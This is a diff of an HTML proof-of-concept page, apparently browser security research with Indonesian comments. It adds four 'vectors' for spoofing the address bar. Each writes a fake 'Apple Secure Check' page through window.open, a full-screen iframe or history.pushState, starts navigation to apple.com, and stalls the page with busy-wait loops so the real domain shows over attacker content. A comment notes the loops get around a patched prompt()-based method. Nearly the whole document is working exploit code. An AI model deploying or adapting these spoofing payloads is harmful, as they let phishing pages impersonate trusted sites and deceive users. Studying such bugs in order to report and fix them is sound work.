@@ -6,76 +6,144 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Alternative Bypass Test PoC</title>
+    <title>Multi-Vector Spoofing Test PoC</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #000;
+        background: #111;
         color: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
+        flex-direction: column;
         align-items: center;
         justify-content: center;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+      .container {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        width: 90%;
+        max-width: 400px;
       }
       button {
-        padding: 20px 40px;
-        font-size: 20px;
-        background: #ff3b30;
+        padding: 16px 20px;
+        font-size: 16px;
+        font-weight: bold;
         color: #fff;
         border: none;
-        border-radius: 12px;
+        border-radius: 10px;
         cursor: pointer;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
       }
+      .btn-1 { background: #007aff; }
+      .btn-2 { background: #34c759; }
+      .btn-3 { background: #ff9500; }
+      .btn-4 { background: #ff3b30; }
     </style>
   </head>
   <body>
-    <button id="startBtn">TEST HEAVYS BLOCKING</button>
+
+    <div class="container">
+      <h2 style="text-align:center; margin-bottom:10px; font-size:20px;">Vektor Uji Coba Navigasi</h2>
+      
+      <!-- Vektor 1: Standard Window.open dengan dokumen kosong -->
+      <button class="btn-1" id="btnStandard">1. Standard window.open()</button>
+
+      <!-- Vektor 2: Navigasi via Iframe Overlay di Tab yang Sama -->
+      <button class="btn-2" id="btnIframe">2. Iframe State Injection</button>
+
+      <!-- Vektor 3: History API State Push + Sync Loop -->
+      <button class="btn-3" id="btnHistory">3. History PushState Vector</button>
+
+      <!-- Vektor 4: Multi-Thread Starvation (Busy-wait masif) -->
+      <button class="btn-4" id="btnAggressive">4. Aggressive CPU Starvation</button>
+    </div>
 
     <script>
-      document.getElementById("startBtn").onclick = function () {
-        this.remove();
+      // Payload HTML Penyerang Bersama
+      const attackerPayload = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>Apple - Verified</title></head>
+        <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+          <div>
+            <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:10px;"> Apple Secure Check</h1>
+            <p style="font-size:16px;color:#86868b;">Simulasi penahanan status navigasi asinkron.</p>
+          </div>
+        </body>
+        </html>
+      `;
 
-        const newTab = window.open("about:blank", "_blank");
-
-        if (newTab) {
-          newTab.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Apple - Secured</title></head>
-            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
-              <div>
-                <h1 style="font-size:42px;color:#1d1d1f;">STRESS TEST VIEWPORT</h1>
-                <p style="font-size:18px;color:#86868b;">Menguji respons pipeline navigasi di bawah tekanan CPU sinkron.</p>
-              </div>
-            </body>
-            </html>
-          `);
-          newTab.document.close();
-
-          // Pemicu navigasi asinkron ke domain target
+      // 1. Vektor Standar (window.open)
+      document.getElementById("btnStandard").onclick = function () {
+        const win = window.open("about:blank", "_blank");
+        if (win) {
+          win.document.write(attackerPayload);
+          win.document.close();
+          setTimeout(() => { win.location.href = "https://apple.com"; }, 5);
           setTimeout(() => {
-            try {
-              newTab.location.href = "https://apple.com:9090";
-            } catch (e) {
-              console.error(e);
-            }
+            const start = Date.now();
+            while (Date.now() - start < 2500) { win.Math.random(); }
+          }, 40);
+        }
+      };
+
+      // 2. Vektor Iframe (Injeksi di halaman yang sama tanpa jendela baru)
+      document.getElementById("btnIframe").onclick = function () {
+        const iframe = document.createElement('iframe');
+        iframe.style.position = 'fixed';
+        iframe.style.top = '0';
+        iframe.style.left = '0';
+        iframe.style.width = '100%';
+        iframe.style.height = '100%';
+        iframe.style.border = 'none';
+        iframe.style.zIndex = '999999';
+        document.body.appendChild(iframe);
+
+        iframe.contentDocument.open();
+        iframe.contentDocument.write(attackerPayload);
+        iframe.contentDocument.close();
+
+        setTimeout(() => {
+          iframe.contentWindow.location.href = "https://apple.com";
+        }, 10);
+      };
+
+      // 3. Vektor History PushState
+      document.getElementById("btnHistory").onclick = function () {
+        try {
+          history.pushState({page: 1}, "Apple", "https://apple.com");
+          const start = Date.now();
+          while (Date.now() - start < 2000) {
+            Math.random();
+          }
+        } catch (e) {
+          console.error(e);
+        }
+      };
+
+      // 4. Vektor Aggressive CPU Starvation (Busy-wait lintas objek)
+      document.getElementById("btnAggressive").onclick = function () {
+        const win = window.open("about:blank", "_blank");
+        if (win) {
+          win.document.write(attackerPayload);
+          win.document.close();
+
+          setTimeout(() => {
+            win.location.href = "https://apple.com";
           }, 2);
 
-          // Membekukan thread utama menggunakan beban komputasi berat (Synchronous Busy-Wait) 
-          // sebagai pengganti fungsi prompt() yang sudah ditambal oleh patch IsVisible().
           setTimeout(() => {
-            try {
-              const start = Date.now();
-              // Memblokir thread selama beberapa detik secara kontinu
-              while (Date.now() - start < 400) {
-                newTab.Math.random(); 
-              }
-            } catch (e) {
-              console.error("Execution blocked:", e);
+            // Membebani CPU secara total agar interaksi bridge UI tertunda
+            let arr = [];
+            const start = Date.now();
+            while (Date.now() - start < 4000) {
+              arr.push(new Array(100000).fill(Math.random()));
+              if(arr.length > 50) arr = [];
             }
-          }, 50);
+          }, 20);
         }
       };
     </script>
